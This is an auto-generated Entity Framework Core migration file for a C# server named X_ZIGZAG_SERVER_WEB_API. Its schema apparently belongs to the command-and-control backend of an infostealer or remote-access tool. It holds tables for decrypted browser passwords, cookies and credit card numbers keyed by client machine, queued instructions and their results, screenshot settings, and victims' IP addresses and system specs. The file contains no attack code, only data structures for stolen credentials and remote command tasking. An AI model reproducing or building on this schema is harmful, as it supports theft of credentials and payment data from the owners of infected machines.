﻿// <auto-generated />
using System;
using Microsoft.EntityFrameworkCore;
using Microsoft.EntityFrameworkCore.Infrastructure;
using Microsoft.EntityFrameworkCore.Migrations;
using Microsoft.EntityFrameworkCore.Storage.ValueConversion;
using Npgsql.EntityFrameworkCore.PostgreSQL.Metadata;
using X_ZIGZAG_SERVER_WEB_API.Data;

#nullable disable

namespace X_ZIGZAG_SERVER_WEB_API.Migrations
{
    [DbContext(typeof(MyDbContext))]
    [Migration("20240802225441_Init")]
    partial class Init
    {
        /// <inheritdoc />
        protected override void BuildTargetModel(ModelBuilder modelBuilder)
        {
#pragma warning disable 612, 618
            modelBuilder
                .HasAnnotation("ProductVersion", "8.0.7")
                .HasAnnotation("Relational:MaxIdentifierLength", 63);

            NpgsqlModelBuilderExtensions.UseIdentityByDefaultColumns(modelBuilder);

            modelBuilder.Entity("X_ZIGZAG_SERVER_WEB_API.Models.Admin", b =>
                {
                    b.Property<string>("Id")
                        .HasColumnType("text");

                    b.Property<string>("Password")
                        .IsRequired()
                        .HasMaxLength(100)
                        .HasColumnType("character varying(100)");

                    b.Property<string>("Username")
                        .IsRequired()
                        .HasMaxLength(100)
                        .HasColumnType("character varying(100)");

                    b.HasKey("Id");

                    b.ToTable("Admins");
                });

            modelBuilder.Entity("X_ZIGZAG_SERVER_WEB_API.Models.CheckSetting", b =>
                {
                    b.Property<string>("Id")
                        .HasColumnType("text");

                    b.Property<bool>("CheckCmds")
                        .HasColumnType("boolean");

                    b.Property<long>("CheckDuration")
                        .HasColumnType("bigint");

                    b.Property<DateTimeOffset>("LatestPing")
                        .HasColumnType("timestamp with time zone");

                    b.Property<int>("Screenshot")
                        .HasColumnType("integer");

                    b.HasKey("Id");

                    b.ToTable("CheckSettings");
                });

            modelBuilder.Entity("X_ZIGZAG_SERVER_WEB_API.Models.Cookie", b =>
                {
                    b.Property<string>("ClientId")
                        .HasColumnType("text");

                    b.Property<long>("CookieId")
                        .HasColumnType("bigint");

                    b.Property<string>("BrowserName")
                        .IsRequired()
                        .HasColumnType("text");

                    b.Property<long>("ExpireDate")
                        .HasColumnType("bigint");

                    b.Property<string>("Name")
                        .IsRequired()
                        .HasColumnType("text");

                    b.Property<string>("Origin")
                        .IsRequired()
                        .HasColumnType("text");

                    b.Property<string>("Value")
                        .IsRequired()
                        .HasColumnType("text");

                    b.HasKey("ClientId", "CookieId");

                    b.ToTable("Cookies");
                });

            modelBuilder.Entity("X_ZIGZAG_SERVER_WEB_API.Models.CreditCard", b =>
                {
                    b.Property<string>("ClientId")
                        .HasColumnType("text");

                    b.Property<long>("CreditCardId")
                        .HasColumnType("bigint");

                    b.Property<string>("BrowserName")
                        .IsRequired()
                        .HasColumnType("text");

                    b.Property<string>("CardHolder")
                        .IsRequired()
                        .HasColumnType("text");

                    b.Property<string>("DecrypredCreditCard")
                        .IsRequired()
                        .HasColumnType("text");

                    b.Property<string>("ExpireDate")
                        .IsRequired()
                        .HasColumnType("text");

                    b.Property<string>("Origin")
                        .IsRequired()
                        .HasColumnType("text");

                    b.HasKey("ClientId", "CreditCardId");

                    b.ToTable("CreditCards");
                });

            modelBuilder.Entity("X_ZIGZAG_SERVER_WEB_API.Models.Instruction", b =>
                {
                    b.Property<string>("ClientId")
                        .HasColumnType("text");

                    b.Property<long>("InstructionId")
                        .HasColumnType("bigint");

                    b.Property<short>("Code")
                        .HasColumnType("smallint");

                    b.Property<string>("FunctionArgs")
                        .HasColumnType("text");

                    b.HasKey("ClientId", "InstructionId");

                    b.ToTable("Instructions");
                });

            modelBuilder.Entity("X_ZIGZAG_SERVER_WEB_API.Models.Password", b =>
                {
                    b.Property<string>("ClientId")
                        .HasColumnType("text");

                    b.Property<long>("PasswordId")
                        .HasColumnType("bigint");

                    b.Property<string>("BrowserName")
                        .IsRequired()
                        .HasColumnType("text");

                    b.Property<string>("DecrypredPassword")
                        .IsRequired()
                        .HasColumnType("text");

                    b.Property<string>("Login")
                        .HasColumnType("text");

                    b.Property<string>("Url")
                        .HasColumnType("text");

                    b.HasKey("ClientId", "PasswordId");

                    b.ToTable("Passwords");
                });

            modelBuilder.Entity("X_ZIGZAG_SERVER_WEB_API.Models.Result", b =>
                {
                    b.Property<string>("ClientId")
                        .HasColumnType("text");

                    b.Property<long>("InstructionId")
                        .HasColumnType("bigint");

                    b.Property<short>("Code")
                        .HasColumnType("smallint");

                    b.Property<string>("FunctionArgs")
                        .HasColumnType("text");

                    b.Property<string>("Output")
                        .HasColumnType("text");

                    b.Property<DateTimeOffset>("ResultDate")
                        .HasColumnType("timestamp with time zone");

                    b.HasKey("ClientId", "InstructionId");

                    b.ToTable("Results");
                });

            modelBuilder.Entity("X_ZIGZAG_SERVER_WEB_API.Models.SystemInfo", b =>
                {
                    b.Property<string>("Id")
                        .HasColumnType("text");

                    b.Property<DateTimeOffset>("Created")
                        .HasColumnType("timestamp with time zone");

                    b.Property<string>("CustomName")
                        .HasColumnType("text");

                    b.Property<string>("IpAddress")
                        .IsRequired()
                        .HasColumnType("text");

                    b.Property<DateTimeOffset>("LatestUpdate")
                        .HasColumnType("timestamp with time zone");

                    b.Property<string>("Name")
                        .IsRequired()
                        .HasColumnType("text");

                    b.Property<string>("SystemSpecs")
                        .IsRequired()
                        .HasColumnType("text");

                    b.Property<string>("Version")
                        .IsRequired()
                        .HasColumnType("text");

                    b.HasKey("Id");

                    b.ToTable("SystemsInfo");
                });
#pragma warning restore 612, 618
        }
    }
}
